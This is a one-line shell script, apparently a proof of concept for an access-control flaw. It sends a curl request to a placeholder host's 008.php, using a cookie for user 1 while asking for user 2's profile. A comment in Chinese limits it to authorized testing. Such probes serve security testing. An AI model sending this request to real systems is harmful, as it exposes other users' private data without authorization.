#!/usr/bin/env sh
set -eu
# 仅限授权测试；替换 TARGET 后手动执行
curl -sS -i -X GET 'http://TARGET:8080/008.php?action=View%20Profile&user_id=2' -H 'Cookie: user_id=1'
